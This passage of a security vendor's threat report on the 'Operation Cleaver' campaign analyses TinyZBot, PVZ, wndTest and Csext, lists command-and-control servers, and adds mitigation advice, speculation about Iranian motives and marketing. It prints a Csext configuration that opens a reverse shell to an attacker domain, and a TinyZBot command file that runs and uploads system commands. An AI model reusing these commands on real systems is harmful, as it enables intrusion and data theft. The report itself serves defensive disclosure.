xmlns:xsi=”http://www.\nw3.org/2001/XMLSchema-instance”\nxmlns:xsd=”http://www.w3.org/2001/XMLSchema”>\n<soap:Body><GetFile xmlns=”http://tempuri(dot)org/”><Id>00cf6217-8c7e-4598-b155-65ebd949bba9</\nId><AppType>XYZCO</AppType><IP /><Pass>abefc81</Pass><FileName>[ALL]__b93c-49a1-140914084450__\n[00000000000000000000000000000000].tmu</FileName></GetFile></soap:Body></soap:Envelope>\nHTTP/1.1 200 OK \nCache-Control: private, max-age=0\nContent-Type: text/xml; charset=utf-8 \nServer: Microsoft-IIS/7.5 \nX-AspNet-Version: 2.0.50727 \nX-Powered-By: ASP.NET Date: Mon, 06 Oct 2014 13:36:47 GMT\nContent-Length: 652\n<?xml version=”1.0” encoding=”utf-8”?><soap:Envelope xmlns:soap=”http://schemas.\nxmlsoap.org/soap/envelope/” xmlns:xsi=”http://www.w3.org/2001/XMLSchema-instance” \nxmlns:xsd=”http://www.w3.org/2001/XMLSchema”>\n<soap:Body><GetFileResponse xmlns=”http://tempuri(dot)org/”>\n<GetFileResult>OzIwMTQwOTE0X18wODQ0NTANClJVTkNNRD1jbWQuZXhlLC9DIGlwY29uZmlnIC9hbGwgP\nj4gIltJTkZPTERFUl1cZDJkYjY5NmEtMzM2Ny00Njk5LWE4MTUtZGYwOTA5OGJjNTk2LnR4dCIgMj4mMQ0KV\nVBMT0FEPVtJTkZPTERFUl1cZDJkYjY5NmEtMzM2Ny00Njk5LWE4MTUtZGYwOTA5OGJjNTk2LnR4dA0KREVMR\nVRFPVtJTkZPTERFUl1cZDJkYjY5NmEtMzM2Ny00Njk5LWE4MTUtZGYwOTA5OGJjNTk2LnR4dA==\n</GetFileResult></GetFileResponse></soap:Body></soap:Envelope>#OP CLEA VER\n51\n5468696e6b204576696c2c20446f2ff0476f6f4\nTinyZBot Command and Control Protocol (cont.)\nThe command ﬁle downloaded in this example is as follows:\n;20140914__084450\nRUNCMD=cmd.exe,/C ipconfig /all >> “[INFOLDER]\\d2db696a-3367-4699-a815-df09098bc596.txt”2>&1\nUPLOAD=[INFOLDER]\\d2db696a-3367-4699-a815-df09098bc596.txt\nDELETE=[INFOLDER]\\d2db696a-3367-4699-a815-df09098bc596.txt\nThe ﬁrst line is a timestamp of the command. The TinyZBot command parser ignores it. The \nRUNCMD line requests that cmd.exe be executed, with the command ipconfig /all  being \nredirected to a ﬁle in a directory designated for ﬁles to be uploaded. The UPLOAD command \nrequests that this ﬁle is then uploaded over SOAP to the command and control server. The \nDELETE command then requests that the ﬁle be deleted from the infected system. \nThe following is a list of supported commands that TinyZBot responds to:\nCOPY\nREPLACE\nDELETE\nUPLOAD\nFUPLOAD\nCLEARFILES\nCLEAROUPUTFOLDER\nSAVECONFIG\nSAVETOCFGFILE\nRESTART\nRestartForce\nCommands such as GETINFO are often run on newly infected systems, as they decide whether \nthe infection has hit the correct target. There are additional SOAP commands, but they will not be \ncovered in detail. The following is a list of all the SOAP commands: CheckFileMD5, GetFile, \nGetFileList, GetServerTime, UploadFile.\nDeception\nTinyZBot is commonly installed using some form of deception. Recent versions use the resume-\nbased methods reported in the Initial Compromise  sections. An additional method was used for \nearlier versions. When early versions of TinyZBot were executed, they opened an image stored \nin the resource section of the executable and copied the malicious TinyZBot executable to the \n%AppData%  directory. \nMany of the images identiﬁed were of the popular Lebanese singer and actress Haifa Wehbe. The \nbackdoor additionally replaced the original malicious executable with an appropriately named \nimage ﬁle and padded the image ﬁle with null bytes in order to mirror the original ﬁle size.KILL\nDEEPKILL\nEXIT\nEXITFORCE\nRUNAVDETECTOR\nRUNWAIT\nRUNCMD\nUCMD\nGETINFO\nGETSCREENSHOTHQGETSCREENSHOT\nCREATEUPLOADLIST\nFORCERESTART\nFORCEEXIT\nUNLOADMODULE\nRELOADMODULE\nLOADMODULE\nUNLOADM\nRELOADM\nREMOVEMUNLOADALL\nRELOADALL\nADDSEC\nREMSEC\nADDKV\nCHGKV\nREMKV\nADDK\nREMOVEKOPERATION\nCLEA VER\n52 5468696e6b204576696c2c20446f20476f6f64History\nThe earliest known version on TinyZBot was compiled on January 27, 2013. This early version \nhad very little functionality. It was limited to logging keystroke data, sending emails, and creating \na link in the user’s startup folder for persistence. Its method of exﬁltrating the logged keystrokes \nrelied upon a hardcoded email address stored in the binary. The sender email address was \ndyanachear(at)beyondsys.com  and emails were destined for testmail_00001(at)\nyahoo.com . The message was intended to look like common Viagra spam from China, but \nwould be sent with the keystroke logging data as attachments, as well as system information. \nThe initial version did not provide any means of receiving commands and was obfuscated with \nSmartAssembly. The following iteration compiled on March 12, 2013, only contained minor bug \nﬁxes.\nThe next version was compiled on April 24, 2013. This version starts to look more like an \naverage bot. A command and control protocol was established, using HTTP and SOAP for the \nprotocol. The command and control server for this version was located at 173.192.144.68/\nDefaultWS(dot)asmx . This new command and control protocol allowed for the addition of \nquite a few other features. An update mechanism was added, and could be regularly scheduled, \nso unassisted periodic update checks were automatically performed. The SOAP API used a \ndynamic password mechanism, which required the computation of a simple key in order to \naccess certain parts of the API. The email data exﬁltration method also underwent modiﬁcation \nto be activated at a scheduled interval. There were also some changes, which looked to be bug \nﬁxes, such as limiting the number of times sending an email could fail.\nThe next day, April 25, 2013, a new version was compiled which allowed for self-deletion.\nOn May 14, 2013, we noticed a change which assisted in the identiﬁcation of active targets. \nThe AppUsageId  (at this point named AppType) was an identiﬁer used by this organization in \norder to differentiate between targets infected with TinyZBot, meaning they could effectively \nrun multiple campaigns using the same command and control server and know which target \nwas infected. This also allowed for separate commands to be supplied to different targets \nwithout the need for per-bot commands. At this time, the AppUsageId  was total0, but later \nwe observed names, which aligned with active targets. The exﬁltration email address was also \nchanged to TerafficAnalyzer(at)yahoo.com .\nOn June 17, 2013, there was an addition that allowed for the loading of conﬁguration data from \nthe PE’s resources. At this time, it was limited to the exﬁltration email address. This version was \nnot obfuscated with SmartAssembly#OP CLEA VER\n53\n5468696e6b204576696c2c20446f2ff0476f6f4\nHistory (cont.)\nWe do not see a new version of TinyZBot until June 7, 2014. There are quite a few notable \nimprovements, but nowhere near enough to indicate consistent development on the project for \na year. SmartAssembly was reused again. A method was added to detect what security related \nsoftware is installed. Avira antivirus was speciﬁcally targeted and disabled, due to its detection of \nthe new keystroke logger module added in this version. This keystroke logger source is publicly \navailable and referred to as DeadkeyLogger. \nA new string encryption class is added, but the code was copied and pasted from a Microsoft \nexample. The ability to extract Internet Explorer passwords was added. Clipboard monitoring \ncode was added, but not invoked. The emailing features were removed, but the classes which \npreviously contained them were still present but empty. Many more options were enabled to \nbe loaded from PE resources. The ability to add PE resources was added. Another version was \ncompiled on June 7, 2014, with no feature difference.\nOn June 17, 2014, we see the ﬁrst instance of Binder_1 , which is aptly named, as it is a binder.  \nThe legitimate application used in this version of Binder_1  was compiled on August 22, 2013, \nand is a self-extracting archive of desktop wallpapers, including an image from the game Mirror’s \nEdge . The TinyZBot included was the version compiled on June 7, 2014.\nThe version compiled on June 23, 2014, added functionality which allowed screenshots of the \ndesktop to be taken.\nOn August 2, 2014, we see another version without SmartAssembly obfuscation. A bug ﬁx is made \nto the keystroke logging method, and clipboard monitoring is enabled.\nThree items were compiled on August 18, 2014. Two of them are TinyZBot binaries, which contain \na minor key logging bug ﬁx. The third is a new Binder_1  instance, which contains one of the \nTinyZBot instances compiled that day. The legitimate application included in this binder is called \nEasy_resume_creator  and is a legitimate application named EasyRésuméCreatorPro. This \nversion targeted a major Saudi Arabian oil company.\nFrom August 23 to August 26, 2014, new versions of TinyZBot were compiled with the \nAppUsageIds  targeting major oil and gas companies in Qatar and Kuwait, Ministries of Foreign \nAffairs in the Persian Gulf, and a major airline holding company in UAE. These versions of \nTinyZBot moved towards a more modular architecture where each component was in its own \n.NET assembly. This was presumably done to limit antivirus detection of each individual ﬁle as \nwell as allow for dynamic updating of speciﬁc modules. All of these were included in their own \nBinder_1  instance, which also dropped Easy_resume_creator . OPERATION\nCLEA VER\n54\n5468696e6b204576696c2c20446f20476f6f64\nHistory (cont.)\nThere also seem to be improved software engineering practices in many locations. FTP upload \nsupport was added, with hardcoded credentials of ano:1. This FTP upload functionality points \nto the command and control server, and is invoked by a command in the SOAP command and \ncontrol channel. These versions have the capability to install as a service.\nOn August 25, 2014, the version compiled on August 18 was submitted to a popular virus engine \nwebsite in a ZIP archive located at http://dl.doosan-job(dot)com/cv/\nEasy_Resume_Creator-v2.0.zip . This indicates that TinyZBot is not only being installed \nwhile impersonating a résumé creation suite, but is also impersonating potential employers \nwhen distributed.\nOn September 9, 2014, a ZIP ﬁle containing TinyZBot and a conﬁguration targeting a major US \nuniversity with its AppUsageId  was created. This was discovered on an anonymous FTP server \nin the same IP range as dl.doosan-job(dot)com  along with other malware.\nFrom September 11 through September 17, 2014, some TinyZBot components were compiled, \nalong with a new dropper. This dropper impersonated a tool to submit a résumé to Teledyne. \nWhen executed, the user is prompted to enter personal information, and at the end is given a \nbutton to submit the résumé to Teledyne, although nothing is actually submitted. While the user \nenters this information, their machine is infected with TinyZBot. The AppUsageIds  for these \nversions target a major US-based university as well as an Israeli aerospace company. These \nversions began to include a new method of installing as a service. The service runs with the \nname Network Connectivity Manager .\nInteresting Notes\nTinyZBot, as well as some other tools (Csext, Net Crawler) initially would not run without a \ncommand line parameter set. This was likely to avoid detonation-based detection engines. This \ncommand line parameter was opensesemi  which is often stored in the application’s code in an \nobfuscated manner. The binders and droppers for TinyZBot provided this command line \nargument and others when executing.\nTinyZBot uses a dynamic mutex. This was accomplished by combining a static preset preﬁx with \nthe active process ID. This allowed supplemental tools to keep TinyZBot running by \nenumerating every process and checking if the process ID and mutex preﬁx existed. If no mutex \nand process pair was located, another TinyZBot instance would be started.#OPCLEA VER\n55\n5468696e6b204576696c2c20446f2ff0476f6f4\nCommand and Control Servers\n• 88.150.214.168, United Kingdom, microsoftactiveservices(dot)com\n• 95.211.241.249, Amsterdam, Noord-Holland, Netherlands• 88.150.214.166, United Kingdom• 173.192.144.68, Seattle, Washington, USA• 188.227.180.213, United Kingdom• 192.111.145.197, Rochester, New York, USA\nBackdoors\nMultiple backdoors were used by this organization. These are scripts or applications that allowed for command or code execution outside of the victim network. Many of their backdoors were web applications, added to web servers, so commands can be executed from a browser or client able to communicate with them. This group includes the results of the Shell Creator mentioned in the Attribution section, as well as ASPX backdoors used by Nesha. A PHP shell was also observed, which also included attribution to Nesha in its hashed password.\nAn ASPX backdoor named Zh0uSh311  was located on live servers as well as recovered from \na staging server. This backdoor does not require authentication, and its use appears to be \nstraightforward. Its functionality breaks down into three fairly standard components: SQL queries, executing commands, and uploading ﬁles. \nFigure 24: The ASPX backdoor named “Zh0uSh3ll”, allowing SQL queries.OPERATION\nCLEA VER\n56 5468696e6b204576696c2c20446f20476f6f64\nThis organization utilized backdoors which masqueraded as varying versions of Notepad. They \nreplace the existing Notepad.exe  on the infected machine, and when run they call out to a \nremote server and execute any shell code returned by the remote server. There will be a detailed \nanalysis of these backdoors posted to Cylance’s blog in the future.\nPVZ\nPVZ is a name for a set of executables used together to create a botnet. The name PVZ was \nassigned by us as this is one of the few tools this organization has not named themselves. \nFigure 25: The ASPX backdoor named “Zh0uSh3ll”, allowing ﬁle #OP CLEA VER\n57\n5468696e6b204576696c2c20446f2ff0476f6f4\nPVZ (cont.)\nThe components are as follows:\n• PVZ-In\n• PVZ-Out\n• Syn Flooder\n• LoggerModule\n• XYNTService\n• Jasus\nXYNTService  was not developed by the Cleaver team, but instead is a publicly available project \nwhich executes an executable as a service.\nPVZ-In\nThe purpose of PVZ-In is to communicate with a command and control server. Communication \nis primarily unidirectional, as little information is provided from the bot to its command and \ncontrol server. The known command and control server is located at http://kundenpflege.\nmenrad(dot)de/js/jquery/default.aspx  and the command and control protocol only uses \nHTTP. The commands as well as infected computer information are transferred in the Content-\nDisposition HTTP header, making the traffic easy to pass over as benign.\nWhen a command is received from the server, the results are stored in a central location on disk \nthat the PVZ tools utilize. Command functionality is limited to executing supplied commands, \ndownloading and executing executables as well as self-updating.\nThe debug ﬁle path for PVZ-In is:\nC:\\Users\\parviz\\documents\\visual studio 2010\\Projects\\BotManager\\\nRelease\\BotManager.pdb\nPVZ-In has been observed using the ﬁle name ossisvc.exe.\nPVZ-Out\nPVZ-Out is the other half of the command and control channel, primarily uploading results of \ncommands and keystroke logging data to a remote server. The known command and control server \nfor PVZ-Out is located at http://www.gesunddurchsjahr(dot)de/tor/default.aspx . \nMuch like PVZ-In, this command and control channel communicates with the Content-Disposition \nHTTP header, but for ﬁle data, POST data is supplied. OPERATION\nCLEA VER\n58 5468696e6b204576696c2c20446f20476f6f64Data uploaded is often compressed, which can make it more difficult to detect the exﬁltration of \nsensitive information.\nThe debug ﬁle path for PVZ-Out is:\nC:\\Users\\Parviz\\documents\\visual studio 2010\\Projects\\SendModule\\\nRelease\\SendModule.pdb\nPVZ-Out has been observed with the ﬁle name osppsvc.exe .\nSYN Flooder\nSYN Flooder is a simple network based denial of service tool. It is a command line utility capable of \nbeing invoked by PVZ-In. Targeting information is supplied via command line parameters.\nThe debug ﬁle path for SYN Flooder is:\nC:\\Users\\parviz\\Documents\\Visual Studio 2010\\Projects\\socket-test\\\nRelease\\socket-test.pdb\nSYN Flooder has been observed using the name ossysvc.exe .\nLogger Module\nLogger Module observes the user’s actions and records them to a ﬁle. The recorded actions include \nmouse clicks, active windows, keypresses, as well as clipboard data. The resulting log is written out \nto a location where PVZ-Out can exﬁltrate it to its command and control server. Logger Module has \nbeen observed using the name ospcsvc.exe .\nThe following command and control servers for Logger Module have been observed:\n212.87.154.14, Baden-Wurttemberg, Germany, kundenpflege.menrad(dot)de\n212.87.154.12, Baden-Wurttemberg, Germany, www.gesunddurchsjahr(dot)de\nwndTest\nWndTest is the evolution of the PVZ tool chain into a single executable. The tool chain is minimized \ndown to a command and control communications, keystroke logging, and clipboard monitoring. \nThe command and control still supports upgrading, downloading, and executing of applications, as \nwell as executing batch scripts. WndTest installs as a service and has been observed attempting to \nimpersonate Adobe Report Service. WndTest starts using PHP servers for its command and control \nserver, some of which are listed as defaced sites.#OP CLEA VER\n59\n5468696e6b204576696c2c20446f2ff0476f6f4\nWe have seen wndTest communicate with the following servers:\n• 209.208.97.44, Orlando, Florida, USA, www.lat(dot)am\n• 23.238.17.181, Tulsa, Oklahoma, USA, regulatorfix(dot)com\n• 209.208.97.44, Orlando, Florida, USA, www.asiess(dot)com\n• 198.50.100.210, Quebec, Canada, halon(dot)com.br\n• 207.182.142.68, Columbus, Ohio, USA\n• 95.211.191.247, Amsterdam, Noord-Holland, Netherlands\nCsext\nCsext is a backdoor application developed in C# which runs as a service. Its primary functionality \nis based on commands supplied by its conﬁguration ﬁle. The conﬁguration ﬁle is able to store \nspeciﬁc commands, which are intended to run at particular times. A recovered conﬁguration is as \nfollows:\ndomain1=srv01.microsoftwindowsupdate(dot)net,check.html,3\n%%\n{0}\\{zhname}$$ -h -x -i {domain1} -p 443 -e c:\\windows\\system32\\cmd.\nexe ,taskkill.exe$$/F /PID {pid},00:29,00:35\n%%\n##\nThis conﬁguration executes zhCat to connect back to srv01.microsoftwindowsupdate(dot)net  (a \ndeceptive domain owned by this group with falsiﬁed Whois data attributing to Microsoft Investor \nRelations) with XORed communication using the HTTP protocol on TCP port 443. This zhCat \ninstance is running cmd.exe, effectively making it a reverse connecting shell. This command \nruns at 00:29 in the morning, and is killed by taskkill  at 00:35. This gives the attackers a \npredictable method to regain access to a compromised network if they ever lose access.\nCsext also has email functionality similar to TinyZBot. This email functionality is used to exﬁltrate \nthe results of commands from the command ﬁle which can also include requests like gathering \nuser information.\nWe have seen Csext conﬁgured to communicate with the following servers:\n• 78.47.102.90, Germany, srv01.microsoftwindowsupdate(dot)net\n• 174.36.195.158, Washington D.C, USA, srv01.microsoftupdateserver(dot)\nnetOPERATION\nCLEA VER\n60 5468696e6b204576696c2c20446f20476f6f64MITIGATION COVER\nTTP COVER HERE\nMITIGATION\n#OP CLEA VER\n5468696e6b204576696c2c20446f20476f6f64#OP CLEA VER\n61\n5468696e6b204576696c2c20446f2ff0476f6f4\nMITIGATION\nIf after reviewing the Indicators of Compromise (IOC) listed in Appendix A , you believe your \norganization to be a victim of Operation Cleaver, we recommend you consider the following course \nof action:\n1. If inside the United States, contact the Federal Bureau of Investigation (FBI) via either your local \nFBI team or FBI CYWATCH at 1-855-292-3937 or cywatch@ic.fbi.gov.\n2. If outside the United States, contact your local, district, state or federal law enforcement \nauthorities.\n3. If you have visibility into the attacks on your company and the tools and expertise to track them \ndown, leverage the IOCs in  Appendix A  to identify their presence in your network, prevent them \nfrom expanding the scope of the compromise, and remove their access immediately .\n4. If you do NOT  have visibility into the attacks, need help identifying an existing successful \ncompromise in your organization, or more importantly wish to prevent this attack or attacks similar \nto Operation Cleaver, please contact your security provider.\n5. If you wish to contact Cylance for additional details not available in this report, please email \nopcleaver@cylance.com .\n6. If you would like to learn more about Cylance products and professional services, or discuss how \nCylance can mitigate Operation Cleaver’s impact to your organization, please contact us directly.\n+1 (877) 973 - 3336\nopcleaver@cylance.com\nwww.cylance.comOPERATION\nCLEA VER\n62 5468696e6b204576696c2c20446f20476f6f64SPECULATION COVERTTP COVER HERE\nSPECULATION\n#OP CLEA VER\n5468696e6b204576696c2c20446f20476f6f64#OP CLEA VER\n63\n5468696e6b204576696c2c20446f2ff0476f6f4\nSPECULATION: THE WHY\nIran in 2014 can probably be best described as galvanizing. They have long been an “enemy” of \nthe west, and the United States in particular, but today’s headlines include a variety of topics from \nnuclear talks to human rights to terrorism to cyber hacking. Iran continues to be extremely active on \nthe global stage – and thereby on the radar of every superpower.10\nIran’s cyber sophistication has grown rapidly since the dawn of Stuxnet and they have used hard \ndollars combined with national pride to help build their cyber army. Few doubt their commitment \nas a government and nation state to funding and recruiting cyber warriors to inﬁltrate and damage \ntheir enemies. And it has been commonly postulated that almost all activity since 2010 coming out \nof Iran is associated with retaliation for Stuxnet/Duqu/Flame, which seems natural given the severity \nof the impact. But they don’t need Stuxnet as motivation to want to hack the world. They have long \ndesired power on the political stage, in particular in the ﬁght for nuclear power autonomy.\nWith the deadlines around the Iranian nuclear discussions pushed to 2015, the attacks may be tied \nto negotiating power when discussing a pact with the nuclear superpowers of United States, Britain, \nFrance, Germany, Russia and China.\nThe inner workings of the Iranian government remain largely a mystery to the western world. \nHowever, Iran’s control over its people and the private businesses birthed inside has been well \nreported. In a 2014 Reuters article, the reporters detail how the secret Iranian organization called \n“Setad Ejraiye Farmane Hazrate Emam” has become one of the most powerful organizations in the \ncountry, capable of taking over properties and businesses, buying controlling interests in numerous \nsectors including ﬁnance, oil, telecommunications and many others totaling in upwards of $95B.11 \nEven the US Treasury has documented an extensive fronting of companies in its report of Execution \nof Imam Khomeini’s Order (EIKO), which through its two main subsidiaries controls 37 private \nbusinesses that are purely front companies for the Iranian government.12\n \nThe history of Iran controlling the usage of the Internet and the very Internet on-ramps into Iran is \nwell known13, 14. They have controlled much of the country’s Internet access to date and have taken \nover controlling interests in those companies to carry out their work.  Given Operation Cleaver’s \nfrequent spin-up and take-down of large IP blocks inside the AFRANET IP space inside Iran, \nand Iran’s well recorded investment in cyber warfare14 leads us to one simple conclusion: Iran is \nextremely active in the world of hacking.OPERATION\nCLEA VER\n64 5468696e6b204576696c2c20446f20476f6f64Speculation: The Why (cont.)\nInvolvement with North Korean\nOperation Cleaver’s intense focus on critical infrastructure companies, especially in South Korea, \nhints at information sharing or joint operations with Iran’s partner, North Korea. In September, \n2012, Iran signed an extensive agreement for technology cooperation agreement with North \nKorea, which allows for collaboration on a variety of efforts including IT and security.6\n \nCyber Moving to Physical \nOperation Cleaver’s carefully selected targets like the oil and gas industry, energy and utility \ncompanies, as well as airlines and airports, indicates Iran’s desire to gain deep access into the \nworld’s most critical environments. The end goal of this operation is not known at this time.\nUniversity Recruitment\nUniversity student recruitment was hinted at within Operation Cleaver and is consistent with \nIran’s reported history of active warrior recruitment in the educational space.15\nOverall, there are many reasons that Iran may be pursuing the targets they did in Operation \nCleaver. While we may never truly know, it is important to consider all the above and more when \ntrying to understand the why.#OP CLEA VERCONCLUSION5468696e6b204576696c2c20446f20476f6f64OPERATION\nCLEA VER\n66 5468696e6b204576696c2c20446f20476f6f64CONCLUSION\nAfter tracking the Operation Cleaver team for over two years, we’re led to the inexorable \nconclusion: the government of Iran, and particularly the Islamic Revolutionary Guard Corps \n(IRGC), is backing numerous groups and front entities to attack the world’s critical infrastructure.\nAs security experts in Critical Infrastructure and Key Resources (CIKR), Industrial Control Systems \n(ICS), Supervisory Control and Data Acquisition (SCADA) systems, Building Management Systems \n(BMS), embedded systems and ﬁxed-function systems, we know how easy they are to hack. \nWe have worked with countless customers and vendors throughout the years to notify them of \nvulnerabilities, assist with remediatation efforts, and help mitigate threats to their environments. \nUnfortunately, many critical infrastructure organizations are unable to secure their complex \nenvirnoments against modern attacks. They fall victim to the “glue ﬂu”, a malaise of feeling stuck, \nnot wanting to change the status quo for fear they will ﬁnd problems that they have no idea  how \nto prevent. This “security anaphylaxis” spells real disaster.\nIf Operation Cleaver doesn’t get the world to wake up to what is happening in the silent world of \ncyber, then perhaps nothing will. Prevention is everything  and we should never give up until it’s \nachieved. \nChallenge your trusted advisors. Challenge your security vendors. Demand better technology \nand services to detect, respond, but most importantly PREVENT not just contemporary attacks, \nbut future exotic attacks that have yet to be imagined. That is what truly disruptive and innovative \ntechnology is. Don’t settle for anything less.\nWe hope that by exposing the Operation Cleaver team to the world, current global critical \ninfrastructure victims can be notiﬁed, and prevent future victimization from suffering the \nconsequences of “status quo” security. Unlike United Flight 811, perhaps we can prevent the next \ndisaster.\nDEFENDERS, NEVER GIVE UP!#OP CLEA VER\n67\n5468696e6b204576696c2c20446f2ff0476f6f4\nREFERENCES\n[1] Aboard Flight 811: Passengers’ Routine Dissolves Into Terror - February 1989\nhttp://www.nytimes.com/1989/02/26/us/aboard-ﬂight-811-passengers-routine-dissolves-into-terror.html\n[2] “Forget China: Iran’s Hackers Are American’s Newest Cyber Threat” - February 2014\nhttp://complex.foreignpolicy.com/posts/2014/02/18/forget_china_iran_s_hackers_are_america_s_newest_cyber_\nthreat\n[3] “Developments in Iranian Cyber Warfare 2013-2014” - August 2014\nhttp://www.inss.org.il/uploadImages/systemFiles/SiboniKronenfeld.pdf\n[4] “Iran ups cyber attacks on Israeli computers: Netanyahu” - June 2013\nhttp://uk.reuters.com/article/2013/06/09/us-israel-iran-cyber-idUKBRE95808H20130609\n[5] “Iranians hacked Navy network for four months? Not a surprise.” - February 2014\nhttp://arstechnica.com/information-technology/2014/02/iranians-hacked-navy-network-for-4-months-not-a-surprise/\n[6] “Iran and North Korea Sign Technology Treaty to Combat Hostile Malware” - September 2012\nhttp://www.v3.co.uk/v3-uk/news/2202493/iran-and-north-korea-sign-technology-treaty-to-combat-hostile-malware#\n[7] “Iran’s Paramilitary Militia Is Recruiting Hackers” - January 2011\nhttp://www.forbes.com/sites/jeffreycarr/2011/01/12/irans-paramilitary-militia-is-recruiting-hackers/\n[8] “The Iranian Nuclear Weapon” -  January 2014\nhttp://webcache.googleusercontent.com/search?q=cache:eJbMz7vynpQJ:iranredline.org/index.\nphp%3Fid%3D22+&cd=1&hl=en&ct=clnk&gl=us\n[9] “HPSR Threat Intelligence Brieﬁng Episode 11, February 2014” - February 2014 \nhttp://www8.hp.com/h20195/v2/getpdf.aspx/4AA5-1589ENW.pdf?ver=1.0\n[10] “Intel boss’ warning on cyber attacks no joke, say experts” - November 2014\nhttp://www.foxnews.com/world/2014/11/23/intel-boss-warning-on-cyber-attacks-no-joke-say-experts/\n[11] “Khamenei controls massive ﬁnancial empire built on property seizures” - November 2013\nhttp://www.reuters.com/investigates/iran/#article/part1\n[12] “Treasury Targets Assets of Iranian Leadership” - June 2013\nhttp://www.treasury.gov/press-center/press-releases/Pages/jl1968.aspx\n[13] “Internet Censorship in Iran”\nhttp://en.wikipedia.org/wiki/Internet_censorship_in_Iran\n[14] “Iranian Internet - Fact and Faction” \nhttp://surveillance.rsf.org/en/iran/\n[15] “Iran readying hacker attacks on U.S. infrastructure, specialists say” - April 2012 \nhttp://www.washingtontimes.com/news/2012/apr/25/iran-readying-hacker-attacks-us-infrastructure-spe/?page=allOPERATION\nCLEA VER\n68 5468696e6b204576696c2c20446f20476f6f64ABOUT CYLANCE\nIn the face of growing and evolving threats, traditional cyber protection technologies are now \nwidely considered inadequate. The only way to regain the upper hand against a new generation \nof attackers, is to embrace something entirely new. Something that “thinks” like an attacker. \nSomething that doesn’t rely on a trust model or care about hash lookups. Something with a brain. \n“The world has combated cyber threats by doing the same \nthing over and over again ... it’s the deﬁnition of insanity! ”\nJeff Moss - Co-Chair of the DHS Community Resiliency Task Force\n& Founder of BlackHat and DEFCON security conferences\nCylance has eschewed the old foundations that existing cybersecurity products are built upon. \nInstead, we’ve based our approach on mathematics, machine learning, and data science. This \nalgorithmic approach has been proven to detect – and stop  – exponentially more modern threats. \nLeveraging algorithmic risk modeling, Cylance PROTECT  protects endpoints from everyday viruses, \nworms, trojans, and spyware, but unlike other security products, Cylance PROTECT  offers true \nfuture-proof protection against the most malicious threats in the world. Advanced Persistent Threats \n(APT), 0-days, and exotic exploitation techniques are easily detected and halted with little-to-no \nimpact on the end-user.\nExisting reactive solutions rely on a constant stream of signature updates for threat detection, which \nis not only costly and inconvenient, but also requires “sacriﬁcial lambs”. Only after a previously \nunseen threat has inﬂicted damage can the rest of the industry begin to detect it. Cylance PROTECT  \ndoesn’t require constant updates or even a network connection to protect against so-called \n“previously undetectable” threats. By identifying and defusing attacks in near real time, before the \nattack can execute, we can ﬁnally do away with the need for a “patient zero”.\nAs Richard Stiennon, Chief Research Analyst at IT-Harvest, put it, “Many vendors are trying to solve \nthe endpoint problem, yet Cylance is the only one using the power of math to stop malware and \nwith more effectiveness and efficiency than current solutions”.  \nInterested in seeing what Cylance PROTECT can do for your organization? Contact us!\nCylance is one of the fastest growing cybersecurity technology ﬁrms in the US. Cylance’s ﬂagship product \nCylance PROTECT  has been adopted by Fortune 500 companies and government agencies across the globe.  Cylance \nwas founded by 27-year security industry luminary, Stuart McClure, former Global CTO of McAfee, original founder \nof Foundstone, and lead author of the international best-selling book Hacking Exposed . In building Cylance, Stuart \nbrought together the best scientiﬁc and executive minds from the likes of Cisco, Sourceﬁre, Google and McAfee. The \nCylance board of advisors includes former high-ranking officials from the DHS, the FBI, CIA, and executive titans of \nbusiness. #OP CLEA VER\n69\n5468696e6b204576696c2c20446f2ff0476f6f4\nCYLANCE PRODUCTS\nCylance PROTECT is the only next generation endpoint security product that applies math to \nmute existing and future malware, viruses, worms, trojans, bots, APTs, 0-days, exploits, adware, \nspyware and hacking tools – without needing any updates or even a connection to the Internet. \nThe technology is founded on the principle that to ﬁx the industry, you must start from scratch with \na way as yet unseen. \nCylance PROTECT does not rely on signatures of any sort (blacklist or whitelist), behavioral \nanalysis using IOCs, sandboxing analysis, heuristics, micro-virtualization, or dynamic detonation – \nto detect and prevent malicious ﬁles from executing on a target endpoint.\nWhile every other endpoint security product must collect a sample, analyze, and write a signature \nto detect it, Cylance PROTECT  can detect malware before it executes by statically analyzing \nfeatures found in the binary itself. \nFeatures and Beneﬁts of Cylance PROTECT :\n• Near real time detection of malicious ﬁles, even if they’ve never been seen in the wild.\n• Can be used to augment existing endpoint security or be deployed as a complete replacement.\n• Does not require any signature updates or connection to the cloud.\n• An easy-to-use web management console with intuitive workﬂows.\n• Low-impact endpoint agent.\nFor a demo of Cylance PROTECT,  contact a Cylance expert today!\nFigure 26: Cylance products detect and stop all the malware used in \nOperation Cleaver, even though the vast majority of the samples are \ncompletely missed by the antivirus industry as of this report’s publication.OPERATION\nCLEA VER\n70 5468696e6b204576696c2c20446f20476f6f64CYLANCE SERVICES\nCylance’s Professional Services team is available to assist companies affected by this campaign. \nCylance is providing consulting to companies that may have been targeted by these advanced \nthreat actors. Cylance will perform initial triage in order to determine the extent to which your \ncompany has been affected by this campaign and work towards establishing a containment \nstrategy.   \n \nCylance has two tailored offerings for clients affected by this campaign. The ﬁrst one includes \nICS in our incident response since many companies affected are in the Critical Infrastructure and \nKey Resources (CIKR) vertical. The second offering’s focus is to deploy our proprietary tools and \nmethodologies to detect and mitigate the threats posed by Operation Cleaver.\nOption 1:   ICS Incident Response & APT Detection and Mitigation\nOption 2:  Detection, Remediation, & Mitigation\nFor more information on how the Cylance Professional Services team can assess and respond to \nattacks like the ones obseved in Operation Cleaver, contact sales@cylance.com today.\nCUSTOM SERVICESFORENSIC INVESTIGATIONSINCIDENT RESPONSE\nPENETRATION TESTINGCOMPROMISE ASSESSMENTS\nUncover previously undiscovered \nbreach and damage.Stop the threat, mitigate risk, \nand remediate.\nCheck the integrity of your\nenvironment and infrastructure.\nDig into who, what, where, and \nwhen a compromise occurred.\nGet expert help that addresses YOUR security needs.\n#OP CLEA VER\n71\n5468696e6b204576696c2c20446f2ff0476f6f4\nACKNOWLEDGMENTS\nBrian Wallace\nBrian is a Sr. Security Researcher for Cylance who joined shortly after the company was established. \nHe is best known for his avid botnet research (often going by “botnet_hunter”) and for his novel \nmalware analysis in the A Study in Bots  blog series hosted by Cylance. Brian has been a dedicated \nopen-source developer as well as an advocate for public and private anti-botnet operations.\nBrian actively develops techniques to combat cyber oppositions in positions where resources and \nleverage are in too limited of supply for conventional means. These techniques, cultivated by Stuart \nMcClure, are the Art of Deterrence. In a previous investigation, Art of Deterrence techniques were \nsuccessfully used to divert Indonesian hackers motivated by monetary gain away from their highest \nyielding target group.\nBrian’s botnet research covers a wide range of topics, from using graph analysis to estimate \nthe amount of ransom that has been paid to a ransomware operator, to utilizing IPv4 scanning \ntechniques to identify and take down point of sale malware panels.\nStuart McClure\nStuart is founder, 